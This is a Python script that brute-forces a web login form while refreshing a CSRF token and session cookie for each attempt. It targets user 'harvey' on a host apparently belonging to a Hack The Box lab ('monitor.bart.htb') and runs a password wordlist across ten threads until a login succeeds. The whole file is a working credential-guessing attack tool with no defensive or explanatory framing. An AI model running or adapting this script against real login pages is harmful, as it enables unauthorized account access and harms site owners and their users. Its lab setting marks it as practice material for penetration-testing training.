import argparse
from urllib import response
import requests
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# user to authenticate as
user = "harvey" 
# url of the login page
loginPage = "http://monitor.bart.htb/index.php" 

# regex used to retrieve csrf token from the login form's HTML
# e.g. <input type="hidden" name="csrf" value="abbd7429c433b9d8d383356707a553a3ea91e981a5a73f4a9d2351a83567e9f3" />
csrfPattern = re.compile(r'name="csrf" value="(\w+)"')

def retrieveTokens():
    # retrieve `PHPSESSID` by first performing a GET request
    response = requests.get(url=loginPage)
    sessionCookie = response.headers["Set-Cookie"].split(";")[0]
    csrfToken = csrfPattern.search(response.text)[1]
    return (sessionCookie, csrfToken)

def loginAttempt(password):
    tokens = retrieveTokens()
    headers = {"Cookie" : tokens[0]}
    # e.g. csrf=abbd7429c433b9d8d383356707a553a3ea91e981a5a73f4a9d2351a83567e9f3&user_name=harvey&user_password=123&action=login
    data = {
        "csrf": tokens[1],
        "user_name": user,
        "user_password": password,
        "action": "login",
    }

    print(f"Trying Password '{password}'")
    response = requests.post(loginPage, data=data, headers=headers)
    
    if '<p>The information is incorrect.</p>' in response.text:
        return False
    else:
        return True


def main(wordlist):
    # If max_workers is None or not given, 
    # it will default to the number of processors on the machine, multiplied by 5.
    # assuming that ThreadPoolExecutor is often used to overlap I/O instead of CPU work    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futureuPasswordMap = {executor.submit(loginAttempt, password.strip()): password.strip() for password in open(wordlist, "r", encoding='utf-8', errors='ignore')}
        for future in as_completed(futureuPasswordMap):
            if future.result():
                print(f"Valid Password Found for user '{user}': {futureuPasswordMap[future]}")
                executor.shutdown(True, cancel_futures=True)
                sys.exit(0)
            
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force password when CSRF is enabled")
    parser.add_argument("-w", "--wordlist", help="Path to the password wordlist", required=True, type=str)
    args = parser.parse_args()

    main(args.wordlist)

